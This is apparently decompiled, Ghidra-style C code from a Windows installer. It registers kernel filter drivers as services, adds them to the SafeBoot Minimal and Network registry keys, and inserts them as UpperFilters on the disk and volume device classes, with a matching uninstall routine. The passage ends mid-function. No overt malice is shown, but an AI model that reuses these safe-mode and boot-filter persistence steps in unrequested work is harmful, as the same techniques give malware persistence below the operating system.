
void FUN_140001000(LPCSTR param_1)

{
  bool bVar1;
  LSTATUS LVar2;
  undefined1 auStackY_138 [32];
  DWORD local_e4;
  REGSAM local_e0;
  HKEY local_d8;
  HKEY local_d0 [3];
  _OSVERSIONINFOA local_b8;
  ulonglong local_18;
  
  local_18 = DAT_14001a0b0 ^ (ulonglong)auStackY_138;
  bVar1 = false;
  FUN_140006070((ulonglong *)&local_b8,0,0x9c);
  local_b8.dwOSVersionInfoSize = 0x9c;
  GetVersionExA(&local_b8);
  if ((local_b8.dwMajorVersion == 5) && (local_b8.dwMinorVersion == 0)) {
    bVar1 = true;
  }
  if (bVar1) {
    local_e0 = 0xf003f;
  }
  else {
    local_e0 = 0xf013f;
  }
  LVar2 = RegOpenKeyExA((HKEY)0xffffffff80000002,
                        "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal",0,local_e0,&local_d8
                       );
  if (LVar2 == 0) {
    LVar2 = RegCreateKeyExA(local_d8,param_1,0,(LPSTR)0x0,0,local_e0,(LPSECURITY_ATTRIBUTES)0x0,
                            local_d0,&local_e4);
    if (LVar2 == 0) {
      RegCloseKey(local_d0[0]);
    }
    RegCloseKey(local_d8);
  }
  LVar2 = RegOpenKeyExA((HKEY)0xffffffff80000002,
                        "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network",0,local_e0,&local_d8
                       );
  if (LVar2 == 0) {
    LVar2 = RegCreateKeyExA(local_d8,param_1,0,(LPSTR)0x0,0,local_e0,(LPSECURITY_ATTRIBUTES)0x0,
                            local_d0,&local_e4);
    if (LVar2 == 0) {
      RegCloseKey(local_d0[0]);
    }
    RegCloseKey(local_d8);
  }
  __security_check_cookie(local_18 ^ (ulonglong)auStackY_138);
  return;
}




ulonglong FUN_1400011c0(SC_HANDLE param_1,LPCSTR param_2,LPCSTR param_3,DWORD param_4)

{
  DWORD DVar1;
  undefined4 uVar2;
  SC_HANDLE hSCObject;
  undefined4 extraout_var;
  ulonglong uVar3;
  undefined4 extraout_var_00;
  LPCSTR pCVar4;
  undefined8 uVar5;
  
  uVar5 = 0xf01ff;
  pCVar4 = param_2;
  hSCObject = CreateServiceA(param_1,param_2,param_2,0xf01ff,1,param_4,1,param_3,"Boot File System",
                             (LPDWORD)0x0,(LPCSTR)0x0,(LPCSTR)0x0,(LPCSTR)0x0);
  if (hSCObject == (SC_HANDLE)0x0) {
    DVar1 = GetLastError();
    if (DVar1 == 0x431) {
      uVar3 = CONCAT71((int7)(CONCAT44(extraout_var,DVar1) >> 8),1);
    }
    else {
      uVar2 = FUN_140006190((byte *)"CreateService failed!  Error = %d \n",(ulonglong)DVar1,pCVar4,
                            uVar5);
      uVar3 = CONCAT44(extraout_var_00,uVar2) & 0xffffffffffffff00;
    }
  }
  else {
    if (hSCObject != (SC_HANDLE)0x0) {
      CloseServiceHandle(hSCObject);
    }
    uVar5 = FUN_140001000(param_2);
    uVar3 = CONCAT71((int7)((ulonglong)uVar5 >> 8),1);
  }
  return uVar3;
}




void FUN_1400012d0(undefined8 param_1,int param_2)

{
  longlong lVar1;
  undefined1 *puVar2;
  int local_res10 [6];
  undefined1 auStackY_178 [32];
  HKEY local_148;
  undefined1 local_140;
  LSTATUS local_13c;
  char local_128;
  undefined1 local_127 [271];
  ulonglong local_18;
  
  local_18 = DAT_14001a0b0 ^ (ulonglong)auStackY_178;
  local_140 = 1;
  local_148 = (HKEY)0x0;
  local_128 = '\0';
  puVar2 = local_127;
  for (lVar1 = 0x103; lVar1 != 0; lVar1 = lVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  local_res10[0] = param_2;
  FUN_140006350(&local_128,0x104,0x140015450,param_1);
  local_13c = RegOpenKeyExA((HKEY)0xffffffff80000002,&local_128,0,0xf003f,&local_148);
  if (local_13c == 0) {
    if (local_res10[0] == 0) {
      local_13c = RegDeleteValueW(local_148,L"DeleteFlag");
    }
    else {
      local_13c = RegSetValueExW(local_148,L"DeleteFlag",0,4,(BYTE *)local_res10,4);
    }
    if (local_13c != 0) {
      local_140 = 0;
    }
  }
  else {
    local_140 = 0;
  }
  if (local_148 != (HKEY)0x0) {
    RegCloseKey(local_148);
    local_148 = (HKEY)0x0;
  }
  __security_check_cookie(local_18 ^ (ulonglong)auStackY_178);
  return;
}




undefined1 FUN_140001420(LPCSTR param_1,LPCSTR param_2,short param_3,ulonglong param_4)

{
  undefined4 uVar1;
  SC_HANDLE hSCObject;
  ulonglong uVar2;
  undefined8 uVar3;
  ulonglong uVar4;
  undefined1 local_28;
  
  if ((param_1 == (LPCSTR)0x0) || (param_2 == (LPCSTR)0x0)) {
    local_28 = 0;
  }
  else {
    uVar3 = 0xf003f;
    uVar2 = param_4;
    hSCObject = OpenSCManagerA((LPCSTR)0x0,(LPCSTR)0x0,0xf003f);
    if (hSCObject == (SC_HANDLE)0x0) {
      local_28 = 0;
    }
    else {
      if (param_3 == 1) {
        uVar4 = param_4 & 0xffffffff;
        uVar2 = FUN_1400011c0(hSCObject,param_1,param_2,(DWORD)param_4);
        if ((uVar2 & 0xff) == 0) {
          local_28 = 0;
        }
        else {
          uVar1 = FUN_1400015c0(hSCObject,param_1,param_2,uVar4);
          local_28 = (undefined1)uVar1;
        }
        FUN_1400012d0(param_1,0);
      }
      else if (param_3 == 2) {
        FUN_140001670(hSCObject,param_1,uVar3,uVar2);
        FUN_140001540(hSCObject,param_1);
        local_28 = 1;
        FUN_1400012d0(param_1,1);
      }
      else {
        local_28 = 0;
      }
      if (hSCObject != (SC_HANDLE)0x0) {
        CloseServiceHandle(hSCObject);
      }
    }
  }
  return local_28;
}




bool FUN_140001540(SC_HANDLE param_1,LPCSTR param_2)

{
  BOOL BVar1;
  SC_HANDLE hService;
  bool bVar2;
  
  hService = OpenServiceA(param_1,param_2,0xf01ff);
  if (hService == (SC_HANDLE)0x0) {
    bVar2 = false;
  }
  else {
    BVar1 = DeleteService(hService);
    bVar2 = BVar1 != 0;
    if (hService != (SC_HANDLE)0x0) {
      CloseServiceHandle(hService);
    }
  }
  return bVar2;
}




uint FUN_1400015c0(SC_HANDLE param_1,LPCSTR param_2,undefined8 param_3,undefined8 param_4)

{
  DWORD DVar1;
  uint uVar2;
  BOOL BVar3;
  SC_HANDLE hService;
  undefined8 uVar4;
  
  uVar4 = 0xf01ff;
  hService = OpenServiceA(param_1,param_2,0xf01ff);
  if (hService == (SC_HANDLE)0x0) {
    DVar1 = GetLastError();
    uVar2 = FUN_140006190((byte *)"OpenService failed!  Error = %d \n",(ulonglong)DVar1,uVar4,
                          param_4);
    uVar2 = uVar2 & 0xffffff00;
  }
  else {
    uVar4 = 0;
    BVar3 = StartServiceA(hService,0,(LPCSTR *)0x0);
    if (BVar3 == 0) {
      DVar1 = GetLastError();
      if (DVar1 == 0x420) {
        uVar2 = 0x401;
      }
      else {
        uVar2 = FUN_140006190((byte *)"StartService failure! Error = %d \n",(ulonglong)DVar1,uVar4,
                              param_4);
        uVar2 = uVar2 & 0xffffff00;
      }
    }
    else {
      if (hService != (SC_HANDLE)0x0) {
        BVar3 = CloseServiceHandle(hService);
      }
      uVar2 = CONCAT31((int3)((uint)BVar3 >> 8),1);
    }
  }
  return uVar2;
}




bool FUN_140001670(SC_HANDLE param_1,LPCSTR param_2,undefined8 param_3,undefined8 param_4)

{
  DWORD DVar1;
  BOOL BVar2;
  SC_HANDLE hService;
  undefined8 uVar3;
  LPSERVICE_STATUS lpServiceStatus;
  bool local_38;
  _SERVICE_STATUS local_28;
  
  uVar3 = 0xf01ff;
  hService = OpenServiceA(param_1,param_2,0xf01ff);
  if (hService == (SC_HANDLE)0x0) {
    DVar1 = GetLastError();
    FUN_140006190((byte *)"OpenService failed!  Error = %d \n",(ulonglong)DVar1,uVar3,param_4);
    local_38 = false;
  }
  else {
    lpServiceStatus = &local_28;
    BVar2 = ControlService(hService,1,lpServiceStatus);
    if (BVar2 == 0) {
      DVar1 = GetLastError();
      FUN_140006190((byte *)"ControlService failed!  Error = %d \n",(ulonglong)DVar1,lpServiceStatus
                    ,param_4);
    }
    local_38 = BVar2 != 0;
    if (hService != (SC_HANDLE)0x0) {
      CloseServiceHandle(hService);
    }
  }
  return local_38;
}




bool FUN_140001720(LPSTR param_1,char *param_2,undefined8 param_3,undefined8 param_4)

{
  UINT UVar1;
  
  UVar1 = GetSystemWindowsDirectoryA(param_1,0x104);
  if (UVar1 != 0) {
    FUN_1400062a0(param_1,&DAT_14001544c,"\\SystemRoot",param_4);
    strcat(param_1,"\\");
    strcat(param_1,"system32");
    strcat(param_1,"\\");
    strcat(param_1,param_2);
    strcat(param_1,".sys");
  }
  return UVar1 != 0;
}




void FUN_1400017d0(HKEY param_1,LPCSTR param_2,LPCSTR param_3,char *param_4)

{
  int iVar1;
  size_t sVar2;
  longlong lVar3;
  BYTE *pBVar4;
  undefined1 *puVar5;
  undefined1 auStackY_2b8 [32];
  DWORD local_268 [4];
  BYTE local_258 [272];
  DWORD local_148 [2];
  HKEY local_140;
  LSTATUS local_138;
  BYTE local_128;
  undefined1 local_127 [271];
  BYTE *local_18;
  ulonglong local_10;
  
  local_10 = DAT_14001a0b0 ^ (ulonglong)auStackY_2b8;
  local_138 = 0;
  local_148[0] = 0x104;
  local_268[0] = 7;
  local_140 = (HKEY)0x0;
  local_258[0] = '\0';
  pBVar4 = local_258;
  for (lVar3 = 0x103; pBVar4 = pBVar4 + 1, lVar3 != 0; lVar3 = lVar3 + -1) {
    *pBVar4 = '\0';
  }
  local_128 = '\0';
  puVar5 = local_127;
  for (lVar3 = 0x103; lVar3 != 0; lVar3 = lVar3 + -1) {
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  local_138 = RegCreateKeyExA(param_1,param_2,0,(LPSTR)0x0,0,0xf003f,(LPSECURITY_ATTRIBUTES)0x0,
                              &local_140,(LPDWORD)0x0);
  if (local_138 == 0) {
    local_138 = RegQueryValueExA(local_140,param_3,(LPDWORD)0x0,local_268,&local_128,local_148);
    if ((local_148[0] != 0) && (local_148[0] < 0x105)) {
      memcpy(local_258,&local_128,(ulonglong)local_148[0]);
    }
    if (local_138 == 0) {
      local_18 = local_258;
      while ((*local_18 != '\0' && (iVar1 = _stricmp((char *)local_18,param_4), iVar1 != 0))) {
        sVar2 = strlen((char *)local_18);
        local_18 = local_18 + sVar2 + 1;
      }
      if (*local_18 == '\0') {
        sVar2 = strlen(param_4);
        memcpy(local_18,param_4,sVar2);
        sVar2 = strlen(param_4);
        local_18 = local_18 + sVar2;
        memcpy(local_18,&DAT_140015584,2);
        sVar2 = strlen(param_4);
        local_148[0] = local_148[0] + 1 + (int)sVar2;
      }
    }
    else {
      sVar2 = strlen(param_4);
      memcpy(local_258,param_4,sVar2);
      sVar2 = strlen(param_4);
      memcpy(local_258 + sVar2,&DAT_140015580,2);
      sVar2 = strlen(param_4);
      local_148[0] = (int)sVar2 + 2;
    }
    local_138 = RegSetValueExA(local_140,param_3,0,7,local_258,local_148[0]);
  }
  if (local_140 != (HKEY)0x0) {
    RegCloseKey(local_140);
  }
  __security_check_cookie(local_10 ^ (ulonglong)auStackY_2b8);
  return;
}




void FUN_140001b10(HKEY param_1,LPCSTR param_2,LPCSTR param_3,char *param_4)

{
  int iVar1;
  size_t sVar2;
  longlong lVar3;
  BYTE *pBVar4;
  undefined1 *puVar5;
  undefined1 auStackY_2c8 [32];
  DWORD local_278 [4];
  BYTE local_268 [272];
  DWORD local_158 [2];
  HKEY local_150;
  LSTATUS local_148;
  BYTE local_138;
  undefined1 local_137 [271];
  BYTE *local_28;
  BYTE *local_20;
  size_t local_18;
  ulonglong local_10;
  
  local_10 = DAT_14001a0b0 ^ (ulonglong)auStackY_2c8;
  local_148 = 0;
  local_158[0] = 0x104;
  local_278[0] = 7;
  local_150 = (HKEY)0x0;
  local_268[0] = '\0';
  pBVar4 = local_268;
  for (lVar3 = 0x103; pBVar4 = pBVar4 + 1, lVar3 != 0; lVar3 = lVar3 + -1) {
    *pBVar4 = '\0';
  }
  local_138 = '\0';
  puVar5 = local_137;
  for (lVar3 = 0x103; lVar3 != 0; lVar3 = lVar3 + -1) {
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  local_148 = RegCreateKeyExA(param_1,param_2,0,(LPSTR)0x0,0,0xf003f,(LPSECURITY_ATTRIBUTES)0x0,
                              &local_150,(LPDWORD)0x0);
  if (local_148 == 0) {
    local_148 = RegQueryValueExA(local_150,param_3,(LPDWORD)0x0,local_278,&local_138,local_158);
    if ((local_158[0] != 0) && (local_158[0] < 0x105)) {
      memcpy(local_268,&local_138,(ulonglong)local_158[0]);
    }
    if (local_148 == 0) {
      for (local_28 = local_268; *local_28 != '\0'; local_28 = local_28 + sVar2 + 1) {
        iVar1 = _stricmp((char *)local_28,param_4);
        if (iVar1 == 0) {
          local_20 = local_268 + local_158[0];
          sVar2 = strlen(param_4);
          local_18 = (longlong)local_20 - (longlong)(local_28 + sVar2 + 1);
          sVar2 = strlen(param_4);
          memcpy(local_28,local_28 + sVar2 + 1,local_18);
          sVar2 = strlen(param_4);
          local_158[0] = local_158[0] - ((int)sVar2 + 1);
          local_148 = RegSetValueExA(local_150,param_3,0,7,local_268,local_158[0]);
          break;
        }
        sVar2 = strlen((char *)local_28);
      }
    }
  }
  if (local_150 != (HKEY)0x0) {
    RegCloseKey(local_150);
  }
  __security_check_cookie(local_10 ^ (ulonglong)auStackY_2c8);
  return;
}




void FUN_140001e10(BYTE *param_1,int param_2,int param_3)

{
  LSTATUS LVar1;
  size_t sVar2;
  longlong lVar3;
  CHAR *pCVar4;
  FILETIME *pFVar5;
  undefined1 *puVar6;
  undefined1 auStackY_518 [32];
  int local_4c4;
  BYTE local_4b8;
  undefined1 local_4b7 [271];
  HKEY local_3a8 [2];
  char local_398;
  undefined1 local_397 [271];
  HANDLE local_288;
  _WIN32_FIND_DATAA local_278;
  UINT local_138;
  CHAR local_128 [272];
  BYTE local_18 [8];
  ulonglong local_10;
  
  local_10 = DAT_14001a0b0 ^ (ulonglong)auStackY_518;
  if (param_1 != (BYTE *)0x0) {
    local_128[0] = '\0';
    pCVar4 = local_128;
    for (lVar3 = 0x103; pCVar4 = pCVar4 + 1, lVar3 != 0; lVar3 = lVar3 + -1) {
      *pCVar4 = '\0';
    }
    local_138 = GetSystemWindowsDirectoryA(local_128,0x104);
    if (local_138 != 0) {
      FUN_140006350(local_128 + local_138,(ulonglong)(0x104 - local_138),0x140015588,param_1);
      local_278.dwFileAttributes = 0;
      pFVar5 = &local_278.ftCreationTime;
      for (lVar3 = 0x13c; lVar3 != 0; lVar3 = lVar3 + -1) {
        *(undefined1 *)&pFVar5->dwLowDateTime = 0;
        pFVar5 = (FILETIME *)((longlong)&pFVar5->dwLowDateTime + 1);
      }
      local_288 = FindFirstFileA(local_128,&local_278);
      if (local_288 != (HANDLE)0xffffffffffffffff) {
        if (local_288 != (HANDLE)0xffffffffffffffff) {
          FindClose(local_288);
          local_288 = (HANDLE)0xffffffffffffffff;
        }
        if ((local_278.nFileSizeHigh != 0) || (local_278.nFileSizeLow != 0)) {
          local_398 = '\0';
          puVar6 = local_397;
          for (lVar3 = 0x103; lVar3 != 0; lVar3 = lVar3 + -1) {
            *puVar6 = 0;
            puVar6 = puVar6 + 1;
          }
          FUN_140006350(&local_398,0x104,0x1400155a8,param_1);
          local_4b8 = '\0';
          puVar6 = local_4b7;
          for (lVar3 = 0x103; lVar3 != 0; lVar3 = lVar3 + -1) {
            *puVar6 = 0;
            puVar6 = puVar6 + 1;
          }
          FUN_140006350((char *)&local_4b8,0x104,0x1400155d0,param_1);
          SHDeleteKeyA((HKEY)0xffffffff80000002,&local_398);
          local_3a8[0] = (HKEY)0x0;
          LVar1 = RegCreateKeyExA((HKEY)0xffffffff80000002,&local_398,0,(LPSTR)0x0,0,0xf003f,
                                  (LPSECURITY_ATTRIBUTES)0x0,local_3a8,(LPDWORD)0x0);
          if (LVar1 == 0) {
            local_18[0] = '\x01';
            local_18[1] = '\0';
            local_18[2] = '\0';
            local_18[3] = '\0';
            local_4c4 = RegSetValueExA(local_3a8[0],"Type",0,4,local_18,4);
            if ((local_4c4 == 0) &&
               (local_4c4 = RegSetValueExA(local_3a8[0],"ErrorControl",0,4,local_18,4),
               local_4c4 == 0)) {
              local_18[0] = '\0';
              local_18[1] = '\0';
              local_18[2] = '\0';
              local_18[3] = '\0';
              local_4c4 = RegSetValueExA(local_3a8[0],"Start",0,4,local_18,4);
              if (local_4c4 == 0) {
                sVar2 = strlen((char *)param_1);
                local_138 = (int)sVar2 + 1;
                local_4c4 = RegSetValueExA(local_3a8[0],"DisplayName",0,1,param_1,local_138);
                if (local_4c4 == 0) {
                  sVar2 = strlen((char *)&local_4b8);
                  local_138 = (int)sVar2 + 1;
                  local_4c4 = RegSetValueExA(local_3a8[0],"ImagePath",0,2,&local_4b8,local_138);
                  if (local_4c4 == 0) {
                    sVar2 = strlen("PnP Filter");
                    local_138 = (int)sVar2 + 1;
                    local_4c4 = RegSetValueExA(local_3a8[0],"Group",0,2,(BYTE *)"PnP Filter",
                                               local_138);
                  }
                }
              }
            }
            RegCloseKey(local_3a8[0]);
            if (local_4c4 == 0) {
              if (param_3 != 0) {
                FUN_1400017d0((HKEY)0xffffffff80000002,
                              "SYSTEM\\CurrentControlSet\\Control\\Class\\{71A27CDD-812A-11D0-BEC7-08002BE2092F}"
                              ,"UpperFilters",(char *)param_1);
              }
              if (param_2 != 0) {
                FUN_1400017d0((HKEY)0xffffffff80000002,
                              "SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E967-E325-11CE-BFC1-08002BE10318}"
                              ,"UpperFilters",(char *)param_1);
              }
            }
            else {
              SHDeleteKeyA((HKEY)0xffffffff80000002,&local_398);
            }
          }
        }
      }
    }
  }
  __security_check_cookie(local_10 ^ (ulonglong)auStackY_518);
  return;
}




void FUN_1400022f0(char *param_1,int param_2,int param_3)

{
  int iVar1;
  BOOL BVar2;
  longlong lVar3;
  undefined1 *puVar4;
  undefined1 auStack_4b8 [32];
  char *local_498;
  int local_490;
  undefined1 local_488;
  char local_478;
  undefined1 local_477 [271];
  CHAR local_368;
  undefined1 local_367 [271];
  LSTATUS local_258;
  char local_248;
  undefined1 local_247 [271];
  char local_138;
  undefined1 local_137 [271];
  UINT local_28;
  int local_24;
  int local_20;
  ulonglong local_18;
  
  local_18 = DAT_14001a0b0 ^ (ulonglong)auStack_4b8;
  local_488 = 0;
  if (((param_1 != (char *)0x0) &&
      ((param_3 == 0 ||
       (iVar1 = FUN_140001b10((HKEY)0xffffffff80000002,
                              "SYSTEM\\CurrentControlSet\\Control\\Class\\{71A27CDD-812A-11D0-BEC7-08002BE2092F}"
                              ,"UpperFilters",param_1), iVar1 == 0)))) &&
     ((param_2 == 0 ||
      (iVar1 = FUN_140001b10((HKEY)0xffffffff80000002,
                             "SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E967-E325-11CE-BFC1-08002BE10318}"
                             ,"UpperFilters",param_1), iVar1 == 0)))) {
    local_248 = '\0';
    puVar4 = local_247;
    for (lVar3 = 0x103; lVar3 != 0; lVar3 = lVar3 + -1) {
      *puVar4 = 0;
      puVar4 = puVar4 + 1;
    }
    FUN_140006350(&local_248,0x104,0x1400157e0,param_1);
    local_258 = SHDeleteKeyA((HKEY)0xffffffff80000002,&local_248);
    if ((local_258 == 0) || (local_258 == 2)) {
      local_368 = '\0';
      puVar4 = local_367;
      for (lVar3 = 0x103; lVar3 != 0; lVar3 = lVar3 + -1) {
        *puVar4 = 0;
        puVar4 = puVar4 + 1;
      }
      local_28 = GetSystemWindowsDirectoryA(&local_368,0x104);
      if (local_28 != 0) {
        local_138 = '\0';
        puVar4 = local_137;
        for (lVar3 = 0x103; lVar3 != 0; lVar3 = lVar3 + -1) {
          *puVar4 = 0;
          puVar4 = puVar4 + 1;
        }
        local_498 = param_1;
        FUN_140006350(&local_138,0x104,0x140015808,&local_368);
        local_478 = '\0';
        puVar4 = local_477;
        for (lVar3 = 0x103; lVar3 != 0; lVar3 = lVar3 + -1) {
          *puVar4 = 0;
          puVar4 = puVar4 + 1;
        }
        for (local_24 = 0; local_24 < 10; local_24 = local_24 + 1) {
          local_490 = local_24;
          local_498 = param_1;
          FUN_140006350(&local_478,0x104,0x140015828,&local_368);
          DeleteFileA(&local_478);
        }
        local_488 = 1;
        BVar2 = DeleteFileA(&local_138);
        if (BVar2 == 0) {
          for (local_20 = 0; local_20 < 10; local_20 = local_20 + 1) {
            local_490 = local_20;
            local_498 = param_1;
            FUN_140006350(&local_478,0x104,0x140015848,&local_368);
            BVar2 = MoveFileA(&local_138,&local_478);
            if (BVar2 != 0) break;
          }
        }
      }
    }
  }
  __security_check_cookie(local_18 ^ (ulonglong)auStack_4b8);
  return;
}




void FUN_1400025e0(LPCSTR param_1,longlong param_2)

{
  DWORD DVar1;
  longlong lVar2;
  CHAR *pCVar3;
  undefined1 *puVar4;
  UINT *pUVar5;
  undefined1 auStackY_578 [32];
  int local_544;
  CHAR local_538 [1024];
  int local_138;
  char local_128;
  undefined1 local_127 [259];
  UINT local_24;
  UINT local_20;
  ulonglong local_18;
  
  local_18 = DAT_14001a0b0 ^ (ulonglong)auStackY_578;
  local_538[0] = '\0';
  pCVar3 = local_538;
  for (lVar2 = 0x3ff; pCVar3 = pCVar3 + 1, lVar2 != 0; lVar2 = lVar2 + -1) {
    *pCVar3 = '\0';
  }
  DVar1 = GetPrivateProfileStringA((LPCSTR)0x0,(LPCSTR)0x0,(LPCSTR)0x0,local_538,0x400,param_1);
  if (DVar1 != 0) {
    local_544 = 0;
    for (local_138 = 0; local_138 < 0x400; local_138 = local_138 + 1) {
      if (local_538[local_138] == '\0') {
        if (local_544 == local_138) break;
        local_128 = '\0';
        puVar4 = local_127;
        for (lVar2 = 0x103; lVar2 != 0; lVar2 = lVar2 + -1) {
          *puVar4 = 0;
          puVar4 = puVar4 + 1;
        }
        pUVar5 = &local_24;
        for (lVar2 = 8; lVar2 != 0; lVar2 = lVar2 + -1) {
          *(undefined1 *)pUVar5 = 0;
          pUVar5 = (UINT *)((longlong)pUVar5 + 1);
        }
        strcpy_s(&local_128,0x104,local_538 + local_544);
        local_24 = GetPrivateProfileIntA(&local_128,"DiskFlt",0,param_1);
        local_20 = GetPrivateProfileIntA(&local_128,"VolFlt",0,param_1);
        FUN_140002f30(param_2,&local_128);
        local_544 = local_138 + 1;
      }
    }
  }
  __security_check_cookie(local_18 ^ (ulonglong)auStackY_578);
  return;
}




undefined1 FUN_1400027b0(char *param_1,longlong param_2,longlong *param_3)

{
  size_t sVar1;
  longlong lVar2;
  undefined1 local_48;
  size_t local_38;
  ulonglong local_30;
  longlong local_20;
  longlong local_18 [3];
  
  local_48 = 1;
  if (param_1 == (char *)0x0) {
    local_48 = 0;
  }
  else if (*param_3 == 0) {
    sVar1 = strlen(param_1);
    if (sVar1 != 0) {
      lVar2 = thunk_FUN_14000b970(sVar1 + 1);
      *param_3 = lVar2;
      if (*param_3 == 0) {
        local_48 = 0;
      }
      else {
        local_38 = 0;
        for (local_30 = 0; local_30 < sVar1; local_30 = local_30 + 1) {
          if (param_1[local_30] == ' ') {
            if (local_38 != local_30) {
              local_20 = *param_3 + local_38;
              FUN_140003070(param_2,&local_20);
            }
            *(undefined1 *)(*param_3 + local_30) = 0;
            local_38 = local_30 + 1;
          }
          else {
            *(char *)(*param_3 + local_30) = param_1[local_30];
          }
        }
        *(undefined1 *)(*param_3 + sVar1) = 0;
        if (local_38 != sVar1) {
          local_18[0] = *param_3 + local_38;
          FUN_140003070(param_2,local_18);
        }
      }
    }
  }
  else {
    local_48 = 0;
  }
  return local_48;
}




void FUN_140002980(undefined8 param_1,undefined8 param_2,char *param_3,undefined8 param_4)

{
  char cVar1;
  bool bVar2;
  DWORD DVar3;
  int iVar4;
  undefined8 *puVar5;
  ulonglong uVar6;
  longlong *plVar7;
  char *pcVar8;
  BYTE *pBVar9;
  LPCSTR pCVar10;
  longlong lVar11;
  undefined1 *puVar12;
  char *_Src;
  undefined1 auStack_308 [32];
  undefined4 local_2e8;
  LPVOID local_2e0;
  char local_2d8;
  undefined1 local_2d0 [40];
  byte local_2a8;
  undefined1 local_2a7 [271];
  undefined1 local_198 [32];
  longlong local_178;
  longlong local_170 [3];
  CHAR local_158;
  undefined1 local_157 [271];
  longlong local_48 [2];
  LPVOID local_38;
  longlong local_30;
  longlong local_28;
  longlong local_20;
  longlong local_18;
  ulonglong local_10;
  
  local_10 = DAT_14001a0b0 ^ (ulonglong)auStack_308;
  local_2e8 = 0;
  local_2e0 = (LPVOID)0x0;
  local_2a8 = 0;
  puVar12 = local_2a7;
  for (lVar11 = 0x103; lVar11 != 0; lVar11 = lVar11 + -1) {
    *puVar12 = 0;
    puVar12 = puVar12 + 1;
  }
  DVar3 = GetModuleFileNameA((HMODULE)0x0,(LPSTR)&local_2a8,0x104);
  if ((DVar3 != 0) && (local_178 = FUN_140002e00(&local_2a8,0x5c), local_178 != 0)) {
    *(undefined1 *)(local_178 + 1) = 0;
    FUN_140002f80((longlong)local_198);
    cVar1 = FUN_1400027b0(param_3,(longlong)local_198,(longlong *)&local_2e0);
    if (cVar1 == '\0') {
      FUN_140002fc0((longlong)local_198);
    }
    else if (local_2e0 == (LPVOID)0x0) {
      FUN_140002fc0((longlong)local_198);
    }
    else {
      lVar11 = FUN_140002fe0((longlong)local_198);
      if (lVar11 == 0) {
        FUN_140002fc0((longlong)local_198);
      }
      else {
        local_2d8 = '\x01';
        puVar5 = (undefined8 *)FUN_140003030((longlong)local_198,0);
        iVar4 = FUN_140002dd0((byte *)*puVar5,(byte *)"-Uninstall");
        if (iVar4 == 0) {
          uVar6 = FUN_140002fe0((longlong)local_198);
          if (uVar6 < 2) {
            FUN_140002fc0((longlong)local_198);
            goto LAB_140002d86;
          }
          puVar5 = (undefined8 *)FUN_140003030((longlong)local_198,1);
          _Src = (char *)*puVar5;
          strcat_s((char *)&local_2a8,0x104,_Src);
        }
        else {
          local_2d8 = '\0';
          puVar5 = (undefined8 *)FUN_140003030((longlong)local_198,0);
          _Src = (char *)*puVar5;
          strcat_s((char *)&local_2a8,0x104,_Src);
        }
        FUN_140002e40((longlong)local_2d0);
        puVar12 = local_2d0;
        cVar1 = FUN_1400025e0((LPCSTR)&local_2a8,(longlong)puVar12);
        if (cVar1 == '\0') {
          FUN_140002ea0((longlong)local_2d0);
          FUN_140002fc0((longlong)local_198);
        }
        else {
          FUN_140006190((byte *)"start process!",puVar12,_Src,param_4);
          FUN_140002ec0((longlong)local_2d0,local_170);
          while( true ) {
            plVar7 = FUN_140002f00((longlong)local_2d0,local_48);
            bVar2 = FUN_140003170(local_170,plVar7);
            if (!bVar2) break;
            local_158 = '\0';
            puVar12 = local_157;
            for (lVar11 = 0x103; lVar11 != 0; lVar11 = lVar11 + -1) {
              *puVar12 = 0;
              puVar12 = puVar12 + 1;
            }
            pcVar8 = (char *)FUN_140003130(local_170);
            bVar2 = FUN_140001720(&local_158,pcVar8,_Src,param_4);
            if (bVar2) {
              lVar11 = FUN_140003130(local_170);
              if ((*(int *)(lVar11 + 0x104) == 0) &&
                 (lVar11 = FUN_140003130(local_170), *(int *)(lVar11 + 0x108) == 0)) {
                if (local_2d8 == '\0') {
                  pCVar10 = (LPCSTR)FUN_140003130(local_170);
                  param_4 = 3;
                  _Src = (char *)CONCAT62((int6)((ulonglong)_Src >> 0x10),1);
                  FUN_140001420(pCVar10,&local_158,1,3);
                }
                else {
                  pCVar10 = (LPCSTR)FUN_140003130(local_170);
                  param_4 = 0;
                  _Src = (char *)CONCAT62((int6)((ulonglong)_Src >> 0x10),2);
                  FUN_140001420(pCVar10,&local_158,2,0);
                }
              }
              else if (local_2d8 == '\0') {
                local_20 = FUN_140003130(local_170);
                local_18 = FUN_140003130(local_170);
                pBVar9 = (BYTE *)FUN_140003130(local_170);
                _Src = (char *)(ulonglong)*(uint *)(local_20 + 0x108);
                FUN_140001e10(pBVar9,*(int *)(local_18 + 0x104),*(uint *)(local_20 + 0x108));
              }
              else {
                local_30 = FUN_140003130(local_170);
                local_28 = FUN_140003130(local_170);
                pcVar8 = (char *)FUN_140003130(local_170);
                _Src = (char *)(ulonglong)*(uint *)(local_30 + 0x108);
                FUN_1400022f0(pcVar8,*(int *)(local_28 + 0x104),*(uint *)(local_30 + 0x108));
              }
            }
            FUN_140003150(local_170);
          }
          FUN_140002ea0((longlong)local_2d0);
          FUN_140002fc0((longlong)local_198);
        }
      }
    }
  }
LAB_140002d86:
  if (local_2e0 != (LPVOID)0x0) {
    local_38 = local_2e0;
    thunk_FUN_14000b9c0(local_2e0);
    local_2e0 = (LPVOID)0x0;
  }
  __security_check_cookie(local_10 ^ (ulonglong)auStack_308);
  return;
}




void FUN_140002dd0(byte *param_1,byte *param_2)

{
  FUN_140007070(param_1,param_2);
  return;
}




void FUN_140002e00(byte *param_1,uint param_2)

{
  FUN_140002e20(param_1,param_2);
  return;
}




void FUN_140002e20(byte *param_1,uint param_2)

{
  FUN_140007210(param_1,param_2);
  return;
}




longlong FUN_140002e40(longlong param_1)

{
  longlong lVar1;
  undefined1 local_18 [8];
  undefined1 *local_10;
  
  local_10 = local_18;
  FUN_1400031b0(local_10);
  FUN_1400033d0(param_1);
  lVar1 = FUN_140003250(param_1);
  *(longlong *)(param_1 + 8) = lVar1;
  *(undefined8 *)(param_1 + 0x10) = 0;
  return param_1;
}




void FUN_140002ea0(longlong param_1)

{
  FUN_140003350(param_1);
  return;
}




longlong * FUN_140002ec0(longlong param_1,longlong *param_2)

{
  longlong *plVar1;
  
  plVar1 = (longlong *)FUN_1400031b0(*(undefined8 *)(param_1 + 8));
